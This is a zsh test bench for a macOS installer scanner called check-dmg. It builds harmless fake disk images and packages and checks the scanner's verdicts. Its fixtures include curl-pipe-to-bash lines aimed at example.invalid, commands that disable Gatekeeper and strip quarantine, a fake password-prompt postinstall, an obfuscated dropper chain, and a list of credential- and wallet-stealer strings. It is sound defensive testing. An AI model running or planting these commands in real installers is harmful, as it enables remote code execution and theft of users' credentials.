#!/bin/zsh
# Test bench for check-dmg: builds harmless fake installers (clean ones and trapped ones)
# and checks that check-dmg gives the expected verdict for each.
# The "stealer" samples are tiny programs that only CONTAIN typical strings: they do nothing.
# Requires the Xcode command line tools (clang, codesign, pkgbuild, osacompile).
# Usage: tests/run-tests.sh [path/to/check-dmg]

emulate -L zsh
setopt NO_NOMATCH
HERE="${0:A:h}"
CHECK="${1:-$HERE/../check-dmg}"
CHECK="${CHECK:A}"
T=$(mktemp -d "${TMPDIR:-/tmp}/check-dmg-tests.XXXXXX")
trap 'rm -rf "$T"' EXIT
pass=0; fail=0; typeset -a failed

# ---------------------------------------------------------------- builders
mkprog() { # $1 output, $2 extra C strings (one per line), meant to be found by the scanner
  local out="$1" strs="" l
  for l in ${(f)2}; do strs+="  \"$l\","$'\n'; done
  cat > "$T/p.c" <<EOF
#include <stdio.h>
static const char *s[] = {
$strs  "ok" };
int main(void) { volatile const char *x = s[0]; (void)x; return 0; }
EOF
  clang -O0 -o "$out" "$T/p.c" 2>/dev/null
}
mkapp() { # $1 dir, $2 name, $3 strings for the main program, $4 entitlements plist (optional)
  local app="$1/$2.app"
  mkdir -p "$app/Contents/MacOS"
  cat > "$app/Contents/Info.plist" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>CFBundleExecutable</key><string>$2</string>
<key>CFBundleIdentifier</key><string>test.checkdmg.${2:l}</string>
<key>CFBundleShortVersionString</key><string>1.0</string>
<key>CFBundlePackageType</key><string>APPL</string>
</dict></plist>
EOF
  mkprog "$app/Contents/MacOS/$2" "$3"
  if [[ -n "$4" ]]; then codesign -s - --force --entitlements "$4" "$app" 2>/dev/null
  else codesign -s - --force "$app" 2>/dev/null; fi
}
mkdmg() { # $1 source folder, $2 output .dmg
  ln -s /Applications "$1/Applications" 2>/dev/null
  hdiutil create -quiet -srcfolder "$1" -volname "${2:t:r}" -format UDZO -ov "$2"
}
STEALER=$'login.keychain-db\nChrome Safe Storage\nLogin Data\ncookies.sqlite\nExodus\nElectrum\nhidden answer\napi.telegram.org\n/tmp/out.zip'

# ---------------------------------------------------------------- runner
expect() { # $1 name, $2 file, then pairs: +pattern (must appear) or -pattern (must not)
  local name="$1" file="$2"; shift 2
  local out p ok=1 why=""
  out=$(NO_COLOR=1 "$CHECK" --no-vt "$file" 2>&1)
  for p in "$@"; do
    if [[ "$p" == +* ]]; then print -r -- "$out" | grep -qF -- "${p#+}" || { ok=0; why+=" missing «${p#+}»"; }
    else print -r -- "$out" | grep -qF -- "${p#-}" && { ok=0; why+=" unexpected «${p#-}»"; }; fi
  done
  if (( ok )); then (( pass++ )); print -r -- "  ok    $name"
  else (( fail++ )); failed+=("$name"); print -r -- "  FAIL  $name:$why"; fi
}

print "Building fixtures in $T"

# 1 clean app
mkdir -p "$T/clean"; mkapp "$T/clean" Clean "hello"; mkdmg "$T/clean" "$T/clean.dmg"
# 2 MacKed-style fix script
mkdir -p "$T/fix"; mkapp "$T/fix" Tool "hello"
printf '#!/bin/bash\nsudo spctl --master-disable\nsudo xattr -rd com.apple.quarantine /Applications/Tool.app\n' > "$T/fix/Fix damaged app"; chmod +x "$T/fix/Fix damaged app"
mkdmg "$T/fix" "$T/fix.dmg"
# 3 ClickFix-style command file
mkdir -p "$T/clickfix"; mkapp "$T/clickfix" Player "hello"
printf '#!/bin/bash\necho Installing...\ncurl -fsSL http://example.invalid/i | bash\necho aGVsbG8= | base64 -d\n' > "$T/clickfix/Install.command"; chmod +x "$T/clickfix/Install.command"
mkdmg "$T/clickfix" "$T/clickfix.dmg"
# 4 hidden stealer next to the app
mkdir -p "$T/hidden"; mkapp "$T/hidden" Photo "hello"; mkprog "$T/hidden/.helper" "$STEALER"; mkdmg "$T/hidden" "$T/hidden.dmg"
# 5 stealer inside the app itself
mkdir -p "$T/inapp"; mkapp "$T/inapp" Editor "$STEALER"; mkdmg "$T/inapp" "$T/inapp.dmg"
# 6 malicious package: password prompt in postinstall + LaunchDaemon
mkdir -p "$T/evilpkg/root/Library/LaunchDaemons" "$T/evilpkg/root/Library/Audio/Plug-Ins/Components/Fx.component" "$T/evilpkg/scripts"
touch "$T/evilpkg/root/Library/LaunchDaemons/com.fx.updater.plist" "$T/evilpkg/root/Library/Audio/Plug-Ins/Components/Fx.component/x"
printf '#!/bin/sh\nosascript -e "display dialog \\"Password\\" default answer \\"\\" with hidden answer"\n' > "$T/evilpkg/scripts/postinstall"; chmod +x "$T/evilpkg/scripts/postinstall"
pkgbuild --quiet --root "$T/evilpkg/root" --scripts "$T/evilpkg/scripts" --identifier test.fx --version 1 "$T/evil.pkg" 2>/dev/null
# 7 plain package (plugin only, no scripts)
mkdir -p "$T/goodpkg/root/Library/Audio/Plug-Ins/Components/Eq.component"; touch "$T/goodpkg/root/Library/Audio/Plug-Ins/Components/Eq.component/x"
pkgbuild --quiet --root "$T/goodpkg/root" --identifier test.eq --version 1 "$T/good.pkg" 2>/dev/null
# 8 package whose postinstall is a compiled stealer
mkdir -p "$T/binpkg/root/Applications" "$T/binpkg/scripts"; mkprog "$T/binpkg/scripts/postinstall" "$STEALER"
pkgbuild --quiet --root "$T/binpkg/root" --scripts "$T/binpkg/scripts" --identifier test.bin --version 1 "$T/binpkg.pkg" 2>/dev/null
# 9 nested image (TNT layout: folder > image > app)
mkdir -p "$T/inner"; mkapp "$T/inner" Nested "hello"; mkdmg "$T/inner" "$T/inner.dmg"
mkdir -p "$T/outer/Manual install"; cp "$T/inner.dmg" "$T/outer/Manual install/Nested [TNT].dmg"
printf '#!/bin/bash\nDIR=/tmp/tnt$RANDOM\nmkdir -p $DIR\nxattr -r -d com.apple.quarantine $DIR/*.dmg\n' > "$T/outer/Open Gatekeeper friendly"; chmod +x "$T/outer/Open Gatekeeper friendly"
mkdmg "$T/outer" "$T/outer.dmg"
# 10 AppleScript applet that downloads and runs code
mkdir -p "$T/applet"; osacompile -o "$T/applet/Updater.app" -e 'do shell script "curl -s http://example.invalid/x | sh"' 2>/dev/null; mkdmg "$T/applet" "$T/applet.dmg"
# 11 Terminal settings file that runs a command
mkdir -p "$T/term"; mkapp "$T/term" Viewer "hello"
cat > "$T/term/Open me.terminal" <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict><key>CommandString</key><string>curl -fsSL http://example.invalid/t | bash</string>
<key>RunCommandAsShell</key><false/><key>type</key><string>Window Settings</string></dict></plist>
EOF
mkdmg "$T/term" "$T/term.dmg"
# 12 instructions asking to disable Gatekeeper
mkdir -p "$T/readme"; mkapp "$T/readme" Reader "hello"; printf 'If the app does not open, run in Terminal:\nsudo spctl --master-disable\n' > "$T/readme/README.txt"; mkdmg "$T/readme" "$T/readme.dmg"
# 13 app that accepts outside code (entitlement added by cracks)
cat > "$T/ent.plist" <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict><key>com.apple.security.cs.disable-library-validation</key><true/></dict></plist>
EOF
mkdir -p "$T/ent"; mkapp "$T/ent" Lib "hello" "$T/ent.plist"; mkdmg "$T/ent" "$T/ent.dmg"
# 14 containers: zip and Apple Archive
(cd "$T/clean" && ditto -c -k --keepParent Clean.app "$T/clean.zip")
aa archive -d "$T/clean" -subdir Clean.app -o "$T/clean.aar" 2>/dev/null
# 15 a shell script disguised as an app
mkdir -p "$T/shapp/Fake.app/Contents/MacOS"
printf '#!/bin/bash\ncurl -fsSL http://example.invalid/f | bash\n' > "$T/shapp/Fake.app/Contents/MacOS/Fake"; chmod +x "$T/shapp/Fake.app/Contents/MacOS/Fake"
printf '<?xml version="1.0"?><plist version="1.0"><dict><key>CFBundleExecutable</key><string>Fake</string><key>CFBundleIdentifier</key><string>test.fake</string></dict></plist>' > "$T/shapp/Fake.app/Contents/Info.plist"
mkdmg "$T/shapp" "$T/shapp.dmg"

# 16 dropper package (the real-world chain): postinstall disables Gatekeeper, drops a hidden app
#    in /Library/Application Support and opens it; the app runs an encrypted command with system().
mkdir -p "$T/drop/root/Library/Application Support/Patch.app/Contents/MacOS" "$T/drop/scripts"
cat > "$T/drop/x.c" <<'EOF2'
#include <stdlib.h>
static unsigned char k[] = {0x31,0x22,0x6f,0x00};
int main(void) { char c[4]; for (int i = 0; i < 3; i++) c[i] = k[i] ^ 0x42; c[3] = 0; return c[0] == 'x' ? system(c) : 0; }
EOF2
clang -O0 -o "$T/drop/root/Library/Application Support/Patch.app/Contents/MacOS/Patch" "$T/drop/x.c" 2>/dev/null
printf '<?xml version="1.0"?><plist version="1.0"><dict><key>CFBundleExecutable</key><string>Patch</string><key>CFBundleIdentifier</key><string>com.example.Patch</string><key>CFBundleShortVersionString</key><string>1.0</string></dict></plist>' > "$T/drop/root/Library/Application Support/Patch.app/Contents/Info.plist"
codesign -s - --force "$T/drop/root/Library/Application Support/Patch.app" 2>/dev/null
printf '#!/bin/bash
APP_PATH="/Library/Application Support/Patch.app"
sudo spctl --master-disable
sudo -u "$USER" /usr/bin/open -a "$APP_PATH"
' > "$T/drop/scripts/postinstall"; chmod +x "$T/drop/scripts/postinstall"
pkgbuild --quiet --root "$T/drop/root" --scripts "$T/drop/scripts" --identifier test.drop --version 1 "$T/drop.pkg" 2>/dev/null
mkdir -p "$T/dropdmg"; cp "$T/drop.pkg" "$T/dropdmg/App Installer.pkg"; mkdmg "$T/dropdmg" "$T/drop.dmg"

print "Running check-dmg on 18 cases"
expect "clean app"                 "$T/clean.dmg"    "+CAUTION" "-✖" "+Ad hoc signature" "-hides what it runs"
expect "fix script next to app"    "$T/fix.dmg"      "+DO NOT RUN THE SCRIPT" "+spctl --master-disable" "+xattr -dr com.apple.quarantine"
expect "ClickFix command file"     "$T/clickfix.dmg" "+DO NOT RUN" "+curl -fsSL http://example.invalid/i | bash"
expect "hidden stealer program"    "$T/hidden.dmg"   "+DO NOT RUN" "+DATA STEALER" "+(hidden)"
expect "stealer inside the app"    "$T/inapp.dmg"    "+DO NOT RUN" "+DATA STEALER" "-DO NOT RUN THE SCRIPT"
expect "package with fake prompt"  "$T/evil.pkg"     "+DO NOT RUN" "+hidden answer" "+LaunchDaemons/com.fx.updater.plist"
expect "plain plugin package"      "$T/good.pkg"     "+CAUTION" "-✖" "+No install scripts" "+Nothing set to start automatically"
expect "compiled stealer in pkg"   "$T/binpkg.pkg"   "+DO NOT RUN" "+DATA STEALER" "+runs as root"
expect "nested TNT layout"         "$T/outer.dmg"    "+▸ Nested.app" "+no risky command" "-✖"
expect "AppleScript downloader"    "$T/applet.dmg"   "+AppleScript app" "+DO NOT RUN"
expect "Terminal command file"     "$T/term.dmg"     "+Terminal settings file" "+DO NOT RUN"
expect "instructions to weaken"    "$T/readme.dmg"   "+weaken macOS security" "+CAUTION"
expect "outside code entitlement"  "$T/ent.dmg"      "+disable-library-validation"
expect "zip container"             "$T/clean.zip"    "+▸ Clean.app" "-✖"
expect "Apple Archive container"   "$T/clean.aar"    "+▸ Clean.app" "-✖"
expect "script disguised as app"   "$T/shapp.dmg"    "+is a script" "+DO NOT RUN"
expect "dropper package chain"     "$T/drop.dmg"     "+DO NOT RUN" "+launches a program it placed" "+OUTSIDE Applications" "+hides what it runs" "+Placeholder" "+spctl --master-disable"
expect "VirusTotal table"          "$T/clean.dmg"    "+VIRUSTOTAL" "+clean.dmg" "+virustotal.com/gui/file/"

print ""
print "$pass passed, $fail failed"
(( fail )) && { print "Failed: ${(j:, :)failed}"; exit 1; }
exit 0
